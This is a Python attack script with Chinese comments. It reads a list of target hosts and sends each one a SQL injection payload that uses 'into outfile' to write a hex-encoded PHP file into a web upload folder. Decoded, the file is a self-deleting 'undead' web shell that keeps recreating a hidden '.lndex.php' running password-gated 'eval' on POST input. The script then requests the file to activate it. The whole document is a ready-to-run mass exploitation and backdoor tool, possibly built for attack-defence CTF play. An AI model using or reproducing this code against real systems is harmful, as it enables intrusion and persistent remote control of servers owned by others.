#!/usr/bin/python3
#By purplet
import requests

def prepare_get_post():
    global payload#下面的Payload需根据实际情况判断是否是字符型注入
    payload = "-1' union select 1,0x3C3F706870207365745F74696D655F6C696D69742830293B69676E6F72655F757365725F61626F72742831293B756E6C696E6B285F5F46494C455F5F293B7768696C652831297B66696C655F7075745F636F6E74656E747328272E6C6E6465782E706870272C273C3F706870206966286D643528245F504F53545B2270617373225D293D3D22323132333266323937613537613561373433383934613065346138303166633322297B406576616C28245F504F53545B6A64746D5D293B7D203F3E27293B75736C656570283130293B7D3F3E,3 into outfile '/var/www/html/admin/upload/file.php'#"#路径需要是www-data权限的文件夹
    global data
    data = {
        'username':payload,
        'password':'123'
    }#根据实际情况修改参数
    for i in url_head:
        url_undead = i.strip()+'/admin/upload/file.php'#修改为上传文件路径
        shell_url = i.strip()+shell_addr
        submit_undead_ma(shell_url)
        activate_undead_ma(url_undead)
        
def submit_undead_ma(shell_url):
    try:
        if(int(type)==1):
            res=requests.get(shell_url,data,timeout=2)
        else:
            res=requests.post(shell_url,data,timeout=2)
        if res.status_code == 200:
            result = shell_url + " upload undead_ma success "
            print(result)
        else:
            print(shell_url+" upload undead_ma fail")
    except:
        print(shell_url + " connect shell fail")
        
def activate_undead_ma(url_head1):
    try:
        res = requests.get(url_head1,timeout=2)
        print(url_head1+"[-] 不死马激活失败")
    except:
        print(url_head1+"[+] 不死马激活成功")

if __name__ == '__main__':
    file = open('ip.txt','r')
    url_head = file.readlines()
    print("[+] 请输入存在SQL注入漏洞地址Input example:/login.php")
    shell_addr = input()
    print("[+] 请选择注入类型 1.GET 2.POST")
    global type
    type = input("")
    prepare_get_post()
    